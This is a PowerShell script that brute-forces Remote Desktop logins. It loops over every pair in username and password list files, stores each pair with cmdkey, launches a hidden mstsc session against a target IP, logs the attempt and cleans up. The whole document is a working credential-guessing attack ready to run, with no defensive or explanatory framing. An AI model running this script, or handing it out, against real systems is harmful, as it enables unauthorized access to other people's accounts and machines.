
$target = "192.168.0.101"            # Change to your RDP target IP
$userList = Get-Content ".\user.txt"
$passList = Get-Content ".\pass.txt"

# Delay settings
$launchDelay = 6  # Seconds to wait after launching RDP
$killDelay = 1    # Time to wait before killing mstsc

foreach ($user in $userList) {
    foreach ($pass in $passList) {

        Write-Host "[*] Trying $user : $pass"

        # Store credentials for this attempt
        cmdkey /generic:$target /user:$user /pass:$pass | Out-Null

        # Launch RDP connection silently
        $rdp = Start-Process -FilePath "mstsc.exe" -ArgumentList "/v:$target" -WindowStyle Hidden -PassThru

        # Wait for possible login to occur
        Start-Sleep -Seconds $launchDelay

        # OPTIONAL: Log attempt
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Add-Content -Path ".\rdp_attempts.log" -Value "$timestamp - ${user}:${pass} tried"

        # Cleanup: remove credentials & close RDP window
        cmdkey /delete:$target | Out-Null
        Start-Sleep -Seconds $killDelay
        Stop-Process -Id $rdp.Id -Force -ErrorAction SilentlyContinue
    }
}